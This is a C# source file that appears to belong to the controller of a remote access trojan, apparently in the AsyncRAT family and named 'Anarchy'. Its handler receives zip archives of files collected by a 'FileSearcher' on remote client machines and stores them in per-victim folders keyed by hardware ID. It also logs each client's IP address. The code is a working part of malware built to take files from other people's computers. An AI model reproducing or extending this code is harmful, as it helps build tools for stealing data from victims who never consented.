using System;
using System.Drawing;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Anarchy.Helpers.MessagePack;
using Anarchy.Networking;

namespace Anarchy.Handlers
{
    public class HandleFileSearcher
    {
        public async void SaveZipFile(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath;
                fullPath = Path.Combine(Application.StartupPath, "ClientsFolder", unpack_msgpack.ForcePathObject("Hwid").AsString, "FileSearcher");
                if (!Directory.Exists(fullPath))
                {
                    Directory.CreateDirectory(fullPath);
                }
                await Task.Run(delegate
                {
                    File.WriteAllBytes(bytes: unpack_msgpack.ForcePathObject("ZipFile").GetAsBytes(), path: fullPath + "//" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".zip");
                });
                new HandleLogs().Addmsg("Client " + client.Ip + " File Search success，file located @ ClientsFolder/" + unpack_msgpack.ForcePathObject("Hwid").AsString + "/FileSearcher", Color.Purple);
                client.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg("File Search error " + ex.Message, Color.Red);
            }
        }
    }
}
